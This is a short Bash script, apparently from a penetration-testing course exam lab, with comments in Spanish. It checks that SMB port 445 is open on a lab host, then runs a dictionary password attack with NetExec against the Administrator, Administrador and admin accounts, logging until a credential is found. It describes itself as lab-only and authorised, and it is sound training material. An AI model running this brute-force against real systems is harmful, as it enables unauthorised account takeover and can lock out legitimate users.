#!/usr/bin/env bash
# try-m4-auth.sh — prueba un diccionario DIRIGIDO contra M4 (solo laboratorio).
# Requisitos: M4 encendida, 445 abierto; autorización del dueño.
# Riesgo: varios intentos fallidos pueden bloquear la cuenta si hay lockout policy.
set -uo pipefail

ROOT="/home/kali/IS-EXAMEN-UNIDAD-1/informe"
TARGET="10.10.10.14"
LIST="$ROOT/tools/wordlist-m4.txt"
LOG="$ROOT/evidencias/logs/F04-015-m4-dict.log"

mkdir -p "$ROOT/evidencias/logs"
: > "$LOG"

if ! nmap -Pn -sT -p 445 --host-timeout 10s "$TARGET" 2>/dev/null | grep -q '445/tcp open'; then
  echo "[!] M4 no responde en 445. Enciéndela y reintenta." | tee -a "$LOG"
  exit 1
fi

echo "== Diccionario dirigido contra $TARGET ==" | tee -a "$LOG"
echo "== Lista: $LIST ==" | tee -a "$LOG"
date -u +"Inicio UTC: %FT%TZ" | tee -a "$LOG"

for user in Administrator Administrador admin; do
  echo "" | tee -a "$LOG"
  echo "===== Usuario: $user =====" | tee -a "$LOG"
  OUT=$(nxc smb "$TARGET" -u "$user" -p "$LIST" --local-auth --continue-on-success 2>&1 | tee -a "$LOG")
  if echo "$OUT" | grep -q '\[+\]'; then
    echo "" | tee -a "$LOG"
    echo "[+] CREDENCIAL ENCONTRADA para $user" | tee -a "$LOG"
    break
  fi
done

date -u +"Fin UTC: %FT%TZ" | tee -a "$LOG"
echo "Log: $LOG"
